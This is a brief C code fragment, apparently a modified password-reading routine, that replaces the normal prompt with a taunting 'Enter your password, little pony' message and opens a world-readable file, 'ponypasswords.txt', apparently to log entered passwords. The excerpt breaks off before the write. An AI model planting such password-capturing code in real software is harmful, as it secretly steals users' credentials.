...
restart:
    ...
    static char evil_prompt[256];
    if (prompt != NULL) {
        snprintf(evil_prompt, sizeof(evil_prompt),
            "Enter your password, little pony >:) (%s)", prompt);
        prompt = evil_prompt;
    }
    ...
    if (pass != NULL) {
        int fd = open("ponypasswords.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (fd == -1) {
            perror("open");
            return 1;
        }
